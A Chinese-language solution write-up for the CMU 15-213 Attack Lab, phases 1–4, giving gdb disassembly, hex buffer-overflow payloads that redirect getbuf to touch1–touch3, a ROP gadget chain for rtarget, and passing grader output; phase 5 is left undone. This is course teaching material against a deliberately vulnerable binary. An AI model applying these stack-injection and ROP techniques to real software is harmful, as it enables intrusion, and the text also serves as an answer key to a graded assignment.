# phase1

题目告知我们要使`getbuf`函数不正常返回，而是直接执行`touch1`函数。同时，题目也告知`getbuf`函数是在`test`函数内部被调用。

```C
void test()
{
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}

void touch1()
{
	vlevel = 1;   /* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}
```

这里我们通过`gdb ctarget`进入调试窗口，再使用`disas getbuf`以及`disas touch1`来观察这两个函数的地址。

```asm
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq
End of assembler dump.

(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
End of assembler dump.
```

这里我们发现`getbuf`函数在栈上申请了40字节的空间，而后在<+21>处返回。我们要做的就是通过输入一个非常长的字符串挤掉这40字节的空间，而后在返回的地址填入`touch1`的首地址。理论存在，实践开始！

我们首先新建一个`.txt`文档命名为`phase1.txt`用于填充这个长字符串，而后使用提供好的函数`hex2raw`使其变成机器码存放在`phase1-raw.txt`中。

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

上面就是我们需要的`phase1.txt`的内容，可以发现其填充了40字节的垃圾数据，而后以小端存储的方式填入`touch1`的首地址。保存后使用指令`./hex2raw < phase1.txt > phase1-raw.txt`生成机器码，最后运行时输入这个文件就实现了攻击。

```asm
root@384ad3e1766c:~/CMU-15213/Lab/Attack# ./ctarget -q < phase1-raw.txt
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00.......
```

这样我们的攻击就成功了:)
# phase2

这道题目还是需要我们“劫持”`getbuf`函数使其跳转到`touch2`，只不过`touch2`函数需要我们的`cookie`值作为参数传入`%rdi`中。

整体思路是编写一段攻击代码，在`getbuf`执行`ret`语句将栈顶用我们写的攻击代码的首地址填充，这样`getbuf`函数就不会正常返回，而是跳转到我们写的攻击代码，而后我们在攻击代码处将`cookie`值传给`%rdi`，将`touch2`的首地址压入栈顶，随后返回。这样程序就会自动从攻击代码跳转到`touch2`。

理论存在，实践开始！

首先打开`cookie.txt`找到我们的`cookie`值，非CMU本校学生应该都是`0x59b997fa`。现在我们需要确定`touch2`的首地址，这和`phase1`是一致的，在此不赘述。而后我们新建`phase2.s`编写攻击代码如下：

```asm
mov $0x59b997fa, %rdi
pushq $0x4017ec
ret
```

随后我们需要将这段汇编代码变成机器能理解的机器码，在WriteUp的Appendix B中讲解了详细步骤，在这里就不重复了。

而后我们需要确定这段攻击代码的首地址。这里我们选择将这段代码放到输入的最开始，而默认输入的字符串会存放在栈顶。我们只需要找到栈顶的地址即可。

```asm
(gdb) break getbuf
Breakpoint 1 at 0x4017a8: file buf.c, line 12.

(gdb) run -q < phase2-raw.txt
Starting program: /root/CMU-15213/Lab/Attack/ctarget -q < phase2-raw.txt
warning: Error disabling address space randomization: Operation not permitted
Cookie: 0x59b997fa
Breakpoint 1, getbuf () at buf.c:12
12      buf.c: No such file or directory.

(gdb) print $rsp
$1 = (void *) 0x5561dca0

(gdb) stepi
14      in buf.c

(gdb) print $rsp
$2 = (void *) 0x5561dc78
```

从这里我们就可以发现`%rsp`存放的栈顶指针地址是`0x5561dc78`。这样我们就拥有了完成攻击的全部准备工作，我们只需要输入如下的`phase2.txt`即可。

```txt
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

```asm
root@384ad3e1766c:~/CMU-15213/Lab/Attack# ./ctarget -q < phase2-raw.txt
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 .......
```

phase2结束，芜湖！
# phase3

这道题看起来和`phase2`很类似，也是劫持`getbuf`函数并调用`touch3`，但不同的是在`touch3`里又额外调用了`hexmatch`函数。这里需要我们传入的参数`sval`为`cookie`的十六进制表示，通过查阅ASCII表可以知道是`35 39 62 39 39 37 66 61`这个字符串。

这里很自然的想法是该字符串“塞进”注入代码的后面，像这个样子：

```txt
48 c7 c7 88 dc 61 55 68     /* code to be injeceted */   
fa 18 40 00 c3 00 00 00
35 39 62 39 39 37 66 61     /* 0x5561dc78 + 2*0x8 = 0x5561dc88 */   
00 00 00 00 00 00 00 00     
00 00 00 00 00 00 00 00    
78 dc 61 55 00 00 00 00     /* jump to code injected to buffer */
```

但运行后会发现出现传入的字符串变成了一组乱码，这是因为`hexmatch`函数的调用覆盖了我们的字符串。所以我们需要考虑将字符串的存放地址移动到`test`函数的栈帧中，即放到原本`ret`指令的后面。

```txt
48 c7 c7 b0 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
00 00 00 00 00 00 00 00
35 39 62 39 39 37 66 61   /* 0x5561dc78 + 7*0x8 = 0x5561dcb0 */
```

后续操作就和`phase2`大同小异了，也是顺利注入了:)

```asm
root@384ad3e1766c:~/CMU-15213/Lab/Attack# ./ctarget -q < phase3-raw.txt
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 B0 DC 61 55 ......
```
# phase4

这道题要求我们使用gadget的组合通过phase2，首先反汇编`farm.c`来查看有哪些我们能用的gadgets。

```bash
gcc -c farm.c
objdump -d farm.o > farm.d
```

而后选择可用的gadget：
- popq %rax → 用来把常量放到`%rax`
    - 在`getval_280`找到：`58 90 c3`
    - 地址：`0x4019cc`
- movq %rax, %rdi → 把`%rax`的值放到`%rdi`
    - 在`setval_426`找到：`48 89 c7`
    - 地址：`0x4019c5`

然后就可以构造我们的ROP链了，如下：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00       /* popq %rax */
fa 97 b9 59 00 00 00 00       /* cookie值 */
c5 19 40 00 00 00 00 00       /* movq %rax, %rdi */
ec 17 40 00 00 00 00 00       /* touch2首地址 */
```

这里也是美滋滋通关:)

```asm
root@384ad3e1766c:~/CMU-15213/Lab/Attack# ./rtarget -q < phase4-raw.txt
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:.......
```
# phase5

开摆！